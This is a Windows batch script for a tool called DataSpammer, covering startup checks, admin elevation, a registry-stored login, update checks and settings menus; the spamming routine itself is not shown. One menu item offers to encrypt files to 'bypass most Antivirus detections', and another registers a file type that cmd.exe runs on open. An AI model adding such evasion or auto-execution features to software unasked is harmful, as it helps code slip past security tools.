:: Use only under License
:: Contribute under https://github.com/PIRANY1/DataSpammer
:: Version v6 - Beta
:: Last edited on 29.05.2025 by PIRANY

:: Some Functions are inspired from the MAS Script. 

:: Short Copy Paste:
:: =============================================================
:: >nul           = hide normal output
:: 2>nul          = hide error output
:: 2>&1           = merge errors into normal output
:: >nul 2>&1      = hide both normal output and errors
:: pushd "path"   = change to directory and remember previous one
:: popd           = go back to previous directory

:: Example:
:: pushd "C:\Windows"
:: dir >nul
:: popd
:: =============================================================

:: =============================================================
:: %0              = Full path and filename of the batch script
:: %~d0            = Drive letter of the batch script (e.g., D:)
:: %~p0            = Path of the batch script (e.g., \Folder\Subfolder\)
:: %~n0            = Name of the batch script without extension (e.g., script)
:: %~x0            = File extension of the batch script (e.g., .bat)
:: %~dp0           = Drive and path only (e.g., D:\Folder\Subfolder\)
:: %~nx0           = Filename and extension only (e.g., script.bat)

:: Example:
:: echo Running from %~dp0
:: =============================================================

:: =============================================================
:: %~f1            = Full path of argument 1
:: %~d1            = Drive Letter of argument 1
:: %~p1            = Path without Drive Letter of argument 1
:: %~n1            = Filename without extension of argument 1
:: %~x1            = File extension of argument 1
:: %~s1            = Path in short 8.3 format of argument 1
:: %~a1            = File attributes of argument 1
:: %~t1            = Timestamp of argument 1
:: %~z1            = Size of argument 1

:: Example:
:: echo File "%~n1%~x1" is %~z1 bytes and last modified %~t1
:: =============================================================

:: =============================================================
:: for %%A in (*.txt) do echo %%A = loop through all .txt files
:: for /r %%A in (*) do echo %%A = loop recursively through folders
:: echo %var:~0,2% = prints first 2 characters ("he")
:: echo %var:~-2%  = prints last 2 characters ("lo")
:: echo %var:hello=hi%  = replaces "hello" with "hi"
:: %1 %2 %3 ... = First, second, third argument etc.
:: %* = All arguments as a single string
:: Detect if file is locked
:: rename file.txt file.locked >nul 2>&1 || echo File is locked
:: Output 32bit or 64bit
:: echo %PROCESSOR_ARCHITECTURE%
:: Escape special characters
:: ^ = escape symbol (e.g., echo 5^>3 shows "5>3" instead of redirecting)
:: Full random numbers
:: call :generateRandom
:: echo %realrandom%
:: set /p firstLine=<
:: =============================================================

:: Developer Notes
:: Developer Tool is at dev.options
:: Currently Being Reworked

:: Todo: 
::      Add more Comments, Logs , Socket Messages, Error Handling and Coloring
::      Fix Updater - Clueless After 3 Gazillion Updates - Hopefully Fixed
::      Add more to Dev Options

::      V6 Requirements:
::      Check for Bugs / Verify
::      Add Release Workflow w. Setup Build, Encryption etc.
::      Continue Custom Instruction File
::      Fix Wait.exe Delay
::      Check Startmenu Spam
::      Fix Startup Checks
::      Fix Temp RW Check
::      Fix Local RW Check
::      Fix Count
::      Replace Install RW Check with function rw check

:top
    @echo off
    @cls
    @pushd "%~dp0"
    @title DataSpammer - Initiating
    @echo Initializing...
    @setlocal ENABLEDELAYEDEXPANSION
    set "exec-dir=%cd%"
    :: Improve NT Compatabilty - Credits to Gradlew Batch Version
    if "%OS%"=="Windows_NT" setlocal
    set "DIRNAME=%~dp0"
    if "%DIRNAME%"=="" set DIRNAME=.
    :: Set Window Size
    mode con: cols=140 lines=40
    :: Development / Production Flag
    set "current-script-version=development"
    :: Improve Powershell Speed
    set "powershell.short=powershell -ExecutionPolicy Bypass -NoProfile -NoLogo"

    :: Can be Implemented along if errorlevel ...
    set "errormsg=echo: &call :color _Red "====== ERROR ======" &echo:"

    :: Check for NCS Support
    :: NCS is required for ANSI / Color Support
    call :check_NCS
    call :color _Green "ANSI Color Support is enabled"
    call :sys.lt 1

    :: Regular Argument Checks - Documented at help.startup
    if "%~1"=="version" title DataSpammer && goto version
    if "%~1"=="--help" title DataSpammer && goto help.startup
    if "%~1"=="help" title DataSpammer && goto help.startup


    :: Predefine _erl to ensure errorlevel or choice inputs function correctly
    set "_erl=FFFF"

    :: Check if Script is running from Temp Folder
    if /I "%~dp0"=="%TEMP%" (
        cls
        %errormsg%
        call :color _Red "The script was launched from the temp folder."
        call :color _Yellow "You are most likely running the script directly from the archive file."
        call :sys.lt 10 count
        goto cancel
    )
    
    :: Check Windows Version - Win 10 & 11 have certutil and other commands needed. Win 8.1 and below not have them
    call :win.version.check
    for /f "tokens=2 delims=[]" %%a in ('ver') do set "ver_full=%%a"
    for /f "tokens=1-4 delims=." %%a in ("%ver_full%") do (
        set "ver_major=%%a"
        set "ver_minor=%%b"
        set "ver=%%a.%%b"
    )

    :: Compare
    if "%ver%" == "6.1" set "winver=7"
    if "%ver%" == "6.2" set "winver=8"
    if "%ver%" == "6.3" set "winver=8.1"

    if defined winver (
        cls
        %errormsg%
        echo Detected Windows %winver%
        call :color _Yellow "Warning: Some features may not work on this version."
        call :color _Red "For full compatibility, please update to Windows 10 or 11."
        call :color _Yellow "Note: certutil and other tools may be missing on older Windows versions."
        call :sys.lt 10 count
    ) else (
        call :color _Green "Windows Version is sufficient: %ver_full%"
    )    

    :: Check if PowerShell is available
    where powershell >nul 2>&1
    if errorlevel 1 (
        %errormsg%
        call :color _Red "PowerShell is not available."
        echo Script wont work properly.
        call :sys.lt 10 count
    ) else (
        call :color _Green "PowerShell is available."
    )

    :: Check if Powershell is over version 4
    for /f "delims=." %%V in ('%powershell.short% "$PSVersionTable.PSVersion.Major"') do set "PS_MAJOR=%%V"
    if !PS_MAJOR! LSS 4 (
        %errormsg%
        call :color _Red "PowerShell version is too old."
        echo Please update Powershell to at least version 4.
    ) else (
        call :color _Green "Powershell Version is sufficient: !PS_MAJOR!.x"
    )

    :: Check if Script is running from Network Drive
    if /I "%~d0"=="\\\\" (
        %errormsg%
        call :color _Red "The script was launched from a network drive."
        call :color _Yellow "Installation may not work properly."
        call :sys.lt 10 count
    )

    :: Check for Line Issues
    findstr /v "$" "%~nx0" >nul
    if errorlevel 1 (
        call :color _Green "Line endings are correct."
    ) else (
        %errormsg%
        echo Script either has LF line ending issue or an empty line at the end of the script is missing.
        call :sys.lt 20
        goto cancel
    )

    sc query Null | find /i "RUNNING" >nul
    if %errorlevel% NEQ 0 (
    %errormsg%
    echo Null Kernel service is not running, script may crash...
    echo:
    call :sys.lt 20
    ) else (
        call :color _Green "Null Kernel service is running."
    )

    :: Allows ASCII stuff without Codepage Settings - Not My Work - Credits to ?
    :: Properly Escape Symbols like | ! & ^ > < etc. when using echo (%$Echo% " Text)
    SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=

    :: Arguments

    :: If no arguments are given, start the script normally
    if "%~1"=="" goto startup

    :: Apply /b Flag to all Exits
    if "%~1"=="/b" set "b.flag=/b "
    if "%~2"=="/b" set "b.flag=/b "
    if "%~3"=="/b" set "b.flag=/b "

    :: Regular Argument Checks - Documented at help.startup
    if "%~1"=="faststart" title DataSpammer && goto sys.enable.ascii.tweak
    if "%~1"=="update" title DataSpammer && goto fast.git.update
    if "%~1"=="update.script" title DataSpammer && call :update.script "%~2" && goto cancel
    if "%~1"=="remove" title DataSpammer && goto sys.delete.script
    if "%~1"=="debug" title DataSpammer && goto debuglog
    if "%~1"=="debugtest" title DataSpammer && goto debugtest
    if "%~1"=="monitor" title DataSpammer && goto monitor
    if "%~1"=="start" title DataSpammer && goto start.verified
    if "%~1"=="install" title DataSpammer && goto installer.main.window
    
    :: Check if Argument is a Path, then execute it as CIF
    if exist "%~1" if /i "%~x1"==".dts" goto custom.instruction.read

    :: Undocumented Arguments
    if "%~1"=="update-install" ( goto sys.new.update.installed )

    :: Check for DevTools Quick Jump - Undocumented & not used since v4
    if not defined devtools ( goto startup ) else ( goto dev.options )

:startup
    title DataSpammer - Starting
    :: Check for Install Reg Key
    reg query "HKCU\Software\DataSpammer" /v Installed >nul 2>&1
    if %errorlevel% neq 0 (
        call :color _Red "Installation was not executed."
        call :color _Green "Opening installer..."
        goto installer.main.window
    )

    :: Check for Install Reg Key
    for /f "tokens=1,2,*" %%a in ('reg query "HKCU\Software\DataSpammer" /v Version ^| find "Version"') do (
      set "reg_version=%%c"
    ) >nul
    
    :: If no Reg Key is found, port to v6
    if not defined reg_version (
        goto v6.port
    )
    
    :: Check if RegKey is outdated
    if not "%reg_version%"=="%current-script-version%" (
        call :color _Red "Script Version Registry Key is outdated."
        choice /C YN /M "Do you want to update the Registry Key? (Y/N)"
        set "_erl=%errorlevel%"
        if "%_erl%"=="1" ( goto sys.new.update.installed )
    )

    :: Check if Script is executed by Workflow
    if "%workflow.exec%"=="1" echo Script getting executed from GitHub && goto skip.parse

    :: Check for Settings File 
    dir /b | findstr /i "settings.conf" >nul 2>&1 || echo No Settings Found && goto sys.no.settings
    
    :: Verify Settings Hash
    if exist "%~dp0settings.conf" ( call :verify.settings )
    
    :: Parse Config - Doesnt work when no settings file is present
    if exist "%~dp0settings.conf" ( call :parse.settings )

    :: Apply Custom Codepage if defined
    if defined "chcp" (
        chcp %chcp%
        call :color _Green "Codepage set to %chcp%"
    )
    
:skip.parse

    :: Apply Color from Settings
    if defined color ( color %color% ) else ( color 02 )

    :: Elevate Script
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        if "%elevation%"=="sudo" (
            for /f "delims=" %%A in ('where sudo') do set SUDO_PATH=%%A
            %SUDO_PATH% cmd.exe -c %~f0 || goto elevation_failed
            goto cancel
        )
        if "%elevation%"=="gsudo" (
            for /f "delims=" %%A in ('where gsudo') do set GSUDO_PATH=%%A
            %GSUDO_PATH% cmd.exe -k %~f0 || goto elevation_failed
            goto cancel
        )
        if "%elevation%"=="pswh" (
            %powershell.short% -Command "Start-Process '%~f0' -Verb runAs" || goto elevation_failed
            goto cancel
        )
    )
    cd /d "%~dp0"

    :: Check if Temp Folder is writable
    call :rw.check "%temp%"
    if "%errorlevel%"=="1" (
        %errormsg%
        call :color _Red "Temp Folder is not writable."
        echo Script may not work properly.
        call :sys.lt 10 count
    )

    :: Check if local dir is writable
    call :rw.check "%~dp0"
    if "%errorlevel%"=="1" (
        %errormsg%
        call :color _Red "Local Directory is not writable."
        echo Script may not work properly.
        call :sys.lt 10 count
    )

    goto pid.check

:elevation_failed
    %errormsg%
    call :color _Red "Failed to elevate script."
    echo Please run the script as Administrator.
    echo Script will exit in 5 seconds...
    call :sys.lt 5 count
    goto cancel

:pid.check
    :: Get the Parent Process ID of the current script - Needed for Monitor
    %powershell.short% -Command "(Get-CimInstance Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId" > "%temp%\parent_pid.txt"
    if exist "%temp%\parent_pid.txt" ( set /p PID=<"%temp%\parent_pid.txt" ) else ( set "PID=0000" && %errormsg% && call :color _Red "Failed to get Parent PID" && call :sys.lt 4 count) 
    if "%PID%"=="" ( set "PID=0000" && %errormsg% && call :color _Red "Failed to Parse Parent PID" && call :sys.lt 4 count)
    del "%temp%\parent_pid.txt" >nul
    echo Got PID: %PID%

    :: Allow Better Readability
    if %logging% == 1 ( call :log . INFO )
    if %logging% == 1 ( call :log =================== INFO )
    if %logging% == 1 ( call :log DataSpammer_Startup INFO )
    if %logging% == 1 ( call :log Current_PID:_%PID% INFO )
    if %logging% == 1 ( call :log =================== INFO )
    if %logging% == 1 ( call :log . INFO )

    :: Lock Check - Verify that the script is not already running
    :: Extract PID from lock file
    if exist "%~dp0\dataspammer.lock" (
        set "pidlock="
        for /f "usebackq delims=" %%L in ("%~dp0\dataspammer.lock") do set "pidlock=%%L"
    ) else (
        goto lock.create
        if %logging% == 1 ( call :log No_Lock_Exists INFO )
    )   

    :: Remove spaces from Variables
    for /f "tokens=* delims=" %%A in ("!PID!") do set "PID=%%A" >nul 2>&1
    for /f "tokens=* delims=" %%A in ("!pidlock!") do set "pidlock=%%A" >nul 2>&1
    set "PID=!PID: =!"
    set "pidlock=!pidlock: =!"
    if %logging% == 1 ( call :log PID-Check_Results:PID:!pid!_PIDlock:!pidlock! INFO )

    :: If Lock could be parsed compare to current PID 
    if defined pidlock (
        if "!pidlock!"=="!PID!" (
            :: PIDs match, script is already running
            call :color _Red "DataSpammer is already running under PID !pidlock!."
            if %logging% == 1 ( call :log DataSpammer_Already_Running ERROR)
            echo Exiting...
            pause
            goto cancel 
        ) else (
            :: PIDs do not match, lock file still exists
            echo !pidlock! %pid%
            call :color _Red "DataSpammer may have crashed or was closed. Deleting lock file..."
            call :color _Red "Be aware that some tasks may not have finished properly."
            if %logging% == 1 ( call :log DataSpammer_may_have_crashed ERROR )
            del "%~dp0\dataspammer.lock" >nul 2>&1
            call :sys.lt 4 timeout
        )
    ) else (
        :: No PID found in lock file. Delete it 
        echo No PID Found - Deleting Lock...
        if %logging% == 1 ( call :log PID_Empty ERROR )
        del "%~dp0\dataspammer.lock" >nul
    )

    :lock.create
    :: Create a new lock & write current PID to it
    > "%~dp0\dataspammer.lock" echo %PID%
    if "%errorlevel%"=="1" ( %errormsg% && call :color _Red "Failed to create lock file." && call :sys.lt 6 count )

    :: Start the Monitor Socket
    if %monitoring%==1 (
        start /min cmd.exe /k ""%~f0" monitor %PID%" 
        if %logging% == 1 ( call :log Starting_Monitor_Socket INFO )
        >> "%TEMP%\socket.con" echo Connection Request from %PID%
    )

    :: Check if Login is Setup
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v UsernameHash 2^>nul') do set "storedhash=%%A"
    if not defined storedhash goto file.check

:login.input
    if %logging% == 1 ( call :log Starting_Login INFO )
    cls && title DataSpammer - Login

    :: Username and Password Input
    set /p "username.script=Please enter your Username: "
    set "username.script=%username.script: =%"
    for /f "delims=" %%a in ('%powershell.short% -Command "$pass = Read-Host 'Please enter your Password' -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"') do set "password=%%a"

    :: Convert Username and Password to Hash
    echo Converting to Hash...
    for /f "delims=" %%a in ('%powershell.short% -Command "[Text.Encoding]::UTF8.GetBytes('%username.script%') | % { (New-Object -TypeName Security.Cryptography.SHA256Managed).ComputeHash($_) } | ForEach-Object { $_.ToString('x2') } -join '' "') do set "username_hash=%%a"
    for /f "delims=" %%a in ('%powershell.short% -Command "[Text.Encoding]::UTF8.GetBytes('%password%') | % { (New-Object -TypeName Security.Cryptography.SHA256Managed).ComputeHash($_) } | ForEach-Object { $_.ToString('x2') } -join '' "') do set "password_hash=%%a"

    :: Extract Stored Username and Password
    echo Extracting Hash from Registry...
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v UsernameHash 2^>nul') do set "stored_username_hash=%%A"
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v PasswordHash 2^>nul') do set "stored_password_hash=%%A"

    :: echo Calc Username: "%username_hash%"  Stored Username: "%stored_username_hash%"
    :: echo Calc Password: "%password_hash%"  Stored Password: "%stored_password_hash%"
    
    :: Remove Whitespaces
    set "username_hash=%username_hash: =%"
    set "stored_username_hash=%stored_username_hash: =%"
    set "password_hash=%password_hash: =%"
    set "stored_password_hash=%stored_password_hash: =%"

    :: Compare Hashes
    echo Comparing Hashes...
    if "%username_hash%" EQU "%stored_username_hash%" (
        echo Username Matches
        if "%password_hash%" EQU "%stored_password_hash%" (
            echo Password Matches
            goto file.check
        ) else (
            echo Authentication failed. Password does not match.
            if %logging% == 1 ( call :log Password_Not_Matching WARN )
            echo Credentials do not match!
            pause
            goto login.input
        )
    ) else (
        echo Authentication failed. Username does not match.
        echo Credentials do not match!
        if %logging% == 1 ( call :log Username_Not_Matching WARN )
        pause
        goto login.input
    )    


:file.check
    title DataSpammer - Starting

    :: Establish Socket Connection
    call :send_message Started DataSpammer
    call :send_message Established Socket Connection
    if %logging% == 1 ( call :log Established_Socket_Connection INFO )
    if %logging% == 1 ( call :log Checking_Settings_for_Update_Command INFO )

    :: Open Update Logic
    call :gitcall.sys
    goto dts.startup.done

:gitcall.sys
    :: Update Function Logic
    if %logging% == 1 ( call :log Calling_Update_Check INFO )
    :: If Script is in Development Mode, skip the update check
    if "%current-script-version%"=="development" (
        echo Development Version, Skipping Update
        call :sys.lt 3
        if %logging% == 1 ( call :log Skipped_Update_Check_%current-script-version%_Development_Version WARN )
        exit /b
    )
    call :git.version.check
    if "%uptodate%"=="up" ( call :git.version.clean ) else ( call :git.version.outdated )
    exit /b

:git.version.check
    :: Curl GitHub API, extract latest version & compare with current script version
    if %logging% == 1 ( call :log Curling_Github_API INFO )
    echo Checking for Updates...
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    echo Got Release Info...
    echo Extracting Data...
    call :sys.lt 2
    :: Extract Tag Name from JSON Response
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    :: Compare latest version with current script version
    set "latest_version=%latest_version:"=%"
    if "%latest_version%" equ "v6" ( set "uptodate=up" ) else ( set "uptodate=%current-script-version%" )
    if %logging% == 1 ( call :log %latest_version%=v6 INFO )
    del apianswer.txt
    exit /b
    
:git.version.clean
    if %logging% == 1 ( call :log Version_Is_Up_To_Date INFO )
    echo The Version you are currently using is the newest one (%latest_version%)
    call :sys.lt 1
    exit /b

:git.version.outdated
    if %logging% == 1 ( call :log Version_Outdated WARN )
    echo Version Outdated ^!
    call :sys.lt 1
    echo The Version you are currently using is %current-script-version%
    call :sys.lt 1
    echo The newest Version avaiable is %latest_version%
    call :sys.lt 1
    echo:
    echo [1] Update
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Continue Anyways
    call :sys.lt 1
    echo:
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 call :update.script stable && exit
        if %_erl%==2 exit /b
    goto git.version.outdated

:sys.no.settings
    cls
    echo The File "settings.conf" doesnt exist. 
    call :sys.lt 1
    echo A reinstall of the Script is Needed. 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Reinstall Script
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Exit
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto installer.main.window
        if %_erl%==2 goto cancel
    goto sys.no.settings


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------Start.bat  <- Transition -> DataSpammer.bat------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:dts.startup.done
    :: Create Event Log Entry
    EVENTCREATE /T INFORMATION /ID 100 /L APPLICATION /SO DataSpammer /D "Successfully started DataSpammer %errorlevel%" >nul

    :: Compare Hash
    call :dataspammer.hash.check

    title DataSpammer - Finishing Startup
    :: Check if DataSpammer.log is larger than 1MB
    if exist "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" (
        for %%A in ("%userprofile%\Documents\DataSpammerLog\DataSpammer.log") do (
            if %%~zA GTR 1048576 (
                echo DataSpammer.log is larger than 1MB. Renaming to DataSpammer.log.old.
                ren "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" "DataSpammer.log.old"
            )
        )
    )
    :: Remove encrypt File from Installer
    if exist "%~dp0\encrypt.bat" erase "%~dp0\encrypt.bat" >nul 2>&1

    :: Check Developermode
    if "%developermode%"=="1" ( set "dev-mode=1" & echo Enabled Developermode ) else ( set "dev-mode=0" )

    :: Extract CMD Version
    for /f "tokens=2 delims=[]" %%v in ('ver') do set CMD_VERSION=%%v

    :: Logging
    if %logging% == 1 ( call :log Startup_Complete INFO )
    if %logging% == 1 ( call :log Successfully_Started_DataSpammer_%current-script-version%_Errorlevel:_%errorlevel% INFO )

    :: Set Username for Menu
    if not defined username.script set "username.script=%username%"

:menu
    cd /d "%~dp0"
    if %logging% == 1 ( call :log Displaying_Menu INFO )
    title DataSpammer %current-script-version% - Menu - Development
    cls

    %$Echo% "   ____        _        ____
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
    %$Echo% "                             |_|



    call :sys.lt 1
    echo Made by PIRANY - %current-script-version% - Logged in as %username.script% - Batch - CMD Version %CMD_VERSION%
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Start
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Settings
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Autostart/Desktop Icon
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Open GitHub-Repo
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Cancel
    echo:
    echo:
    choice /C 12345S /T 120 /D S /M "Choose an Option from Above: "
        set _erl=%errorlevel%
        if %_erl%==1 goto start
        if %_erl%==2 goto settings
        if %_erl%==3 goto ad.settings
        if %_erl%==4 explorer https://github.com/PIRANY1/DataSpammer && cls && goto menu
        if %_erl%==5 goto cancel
        if %_erl%==6 call :standby
    goto menu


:settings
    if %logging% == 1 ( call :log Opened_Settings_%dev-mode%_dev_mode INFO )
    color
    cls 
    %$Echo% "    ____       _   _   _ 
    %$Echo% "   / ___|  ___| |_| |_(_)_ __   __ _ ___
    %$Echo% "   \___ \ / _ \ __| __| | '_ \ / _` / __|
    %$Echo% "    ___) |  __/ |_| |_| | | | | (_| \__ \
    %$Echo% "   |____/ \___|\__|\__|_|_| |_|\__, |___/
    %$Echo% "                               |___/

    echo:
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    call :color _White "[1] Spam Settings"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Red "[2] Developer Options"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Yellow "[3] Version Control"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Blue "[4] Account"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Green "[5] Restart Script"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Red "[6] Advanced Options"    
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [7] Go back
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1

    choice /C 1234567S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.settings
        if %_erl%==2 goto activate.dev.options
        if %_erl%==3 goto settings.version.control
        if %_erl%==4 goto login.setup
        if %_erl%==5 goto restart.script
        if %_erl%==6 goto advanced.options
        if %_erl%==7 goto menu
        if %_erl%==8 call :standby
    goto settings


:advanced.options
    echo [1] Switch Elevation Method (pswh / sudo / gsudo)
    call :sys.lt 1
    echo [2] Encrypt Files (Bypass most Antivirus detections)
    call :sys.lt 1
    echo [3] Generate Debug Log
    call :sys.lt 1
    echo [4] Logging
    call :sys.lt 1
    echo [5] Monitor
    call :sys.lt 1
    echo [6] Change Color
    call :sys.lt 1
    echo [7] Change Codepage
    call :sys.lt 1
    echo [8] Download Wait.exe - Improve Speed / Wait Time - Source is at PIRANY1/wait.exe (ALPHA)
    call :sys.lt 1
    echo [9] Enable Custom Instruction File (Experimental)
    call :sys.lt 1
    echo [U] Uninstall
    call :sys.lt 1
    echo [R] Repair Settings
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [C] Go back
    choice /C 123456789URCS /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.elevation
        if %_erl%==2 goto encrypt
        if %_erl%==3 goto debuglog
        if %_erl%==4 goto settings.logging
        if %_erl%==5 goto monitor.settings
        if %_erl%==6 goto change.color
        if %_erl%==7 goto change.chcp
        if %_erl%==8 goto download.wait
        if %_erl%==9 goto custom.instruction.enable
        if %_erl%==10 goto sys.delete.script
        if %_erl%==11 goto repair.settings
        if %_erl%==12 goto settings
        if %_erl%==13 call :standby
    goto advanced.options

:custom.instruction.enable
    set "ftypedir=%~0"
    :: Connect .dts with dtsfile type
    ASSOC .dts=dtsfile
    :: Connect dtsfily type with cmd
    FTYPE dtsfile=cmd.exe /c "\"%ftypedir%\" \"%%1\""
    echo Enabled Custom Instructions
    

:custom.instruction.read
    set "interpret.dts=%~1"
    :: check for extension



:download.wait
    :: Download Wait.exe and Wait.exe Hash
    echo Downloading wait.exe
    bitsadmin /transfer upd "https://github.com/PIRANY1/wait-exe/raw/refs/heads/main/bin/wait.exe" "%temp%\wait.exe" >nul
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )   
    echo Downloading Hash...
    bitsadmin /transfer upd "https://github.com/PIRANY1/wait-exe/raw/refs/heads/main/bin/wait.exe.sha256" "%temp%\wait.exe.sha256" >nul
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )  
    :: Extract Hashes
    certutil -hashfile "%temp%\wait.exe" SHA256 > "%temp%\wait.hash"
    for /f "delims=" %%a in ('%powershell.short% -Command "(Get-Content '%temp%\wait.exe.sha256' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do set "sha256_expected=%%a"
    for /f "delims=" %%a in ('%powershell.short% -Command "(Get-Content '%temp%\wait.hash' | Select-String -Pattern '([0-9a-fA-F]{64})').Matches.Groups[1].Value"') do set "sha256_actual=%%a"

    :: Compare Hashes
    if "%sha256_expected%" neq "%sha256_actual%" (
        %errormsg%
        echo Hash mismatch! Expected: %sha256_expected%, but got: %sha256_actual%
        echo Download Failed.
        goto menu
    )
    del "%temp%\wait.hash"
    del "%temp%\wait.exe.sha256"
        
    :: Move Wait.exe    
    move /Y "%temp%\wait.exe" "%~dp0\wait.exe" 
    if errorlevel 1 (
        %errormsg%
        echo Failed to move wait.exe. 
        exit /b 1
    )
    call :color _Green "wait.exe installed successfully."
    echo Restarting...
    goto restart.script

:change.chcp
    :: Change Codepage to allow for different character sets
    for /f "tokens=2 delims=:" %%a in ('chcp') do set "chcp.value=%%a"
    echo Current Codepage: %chcp.value%
    echo:
    echo CHCP Values:
    echo 437	United States
    echo 850	Multilingual (Latin I)
    echo 852	Slavic (Latin II)	 
    echo 855	Cyrillic (Russian)	 
    echo 857	Turkish	 
    echo 860	Portuguese	 
    echo 861	Icelandic	 
    echo 863	Canadian-French	 
    echo 865	Nordic	 
    echo 866	Russian	 
    echo 869	Modern Greek	 
    echo 1252	West European Latin	 
    echo 65000	UTF-7 *	 
    echo 65001	UTF-8 *
    set /p chcp.var=Please enter the Codepage:
    call :update_config "chcp" "" "%chcp.var%" 
    goto restart.script

:change.color
    :: Set Color Dialog
    echo:
    echo Currently Using Color: %color%
    echo:
    echo Color 02 = Black Background ^& Green Text
    echo 0 = Black       8 = Gray
    echo 1 = Blue        9 = Light Blue
    echo 2 = Green       A = Light Green
    echo 3 = Cyan        B = Light Cyan
    echo 4 = Red         C = Light Red
    echo 5 = Purple      D = Light Purple
    echo 6 = Yellow      E = Light Yellow
    echo 7 = Light Gray  F = White
    echo:
    set /p color.var=Please enter the Color Combination:
    call :update_config "color" "" "%color.var%"


:monitor.settings
    if %monitoring%==1 set "monitoring-status=Enabled"
    if %monitoring%==0 set "monitoring-status=Disabled"
    echo -----------------------
    echo Monitor Socket Settings
    echo -----------------------

    echo:
    echo Monitoring is currently %monitoring-status%
    echo:
    echo [1] Enable Monitor Socket
    call :sys.lt 1
    echo [2] Disable Monitor Socket
    call :sys.lt 1
    echo [3] Go back
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto monitor.enable
        if %_erl%==2 goto monitor.disable
        if %_erl%==3 goto advanced.options
        if %_erl%==4 call :standby
    goto monitor.settings

:monitor.enable
    call :update_config "monitoring" "" "1"
    echo Monitor Socket Enabled.
    call :sys.lt 2
    goto monitor.settings

:monitor.disable
    call :update_config "monitoring" "" "0"
    echo Monitor Socket Disabled.
    call :sys.lt 2
    goto monitor.settings

:login.setup
    cls
    echo Logged in as %username.script%
    echo:
    echo [1] Create Account
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Change Login   
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Delete Login
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Discard
    echo:
    echo:
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto login.create
        if %_erl%==2 goto login.change
        if %_erl%==3 goto login.delete
        if %_erl%==4 goto settings
        if %_erl%==5 call :standby
    goto login.setup
    
:login.change
    :: Delete User Account, then create a new one
    echo Changing Login...
    reg delete "HKCU\Software\DataSpammer" /v UsernameHash /f
    reg delete "HKCU\Software\DataSpammer" /v PasswordHash /f
    goto login.create

:login.delete
    :: Delete User Account
    reg delete "HKCU\Software\DataSpammer" /v UsernameHash /f
    reg delete "HKCU\Software\DataSpammer" /v PasswordHash /f
    echo Account deleted successfully.
    echo Restarting Script...
    call :sys.lt 1
    goto restart.script

:login.create
    :: Create new Login Hashes
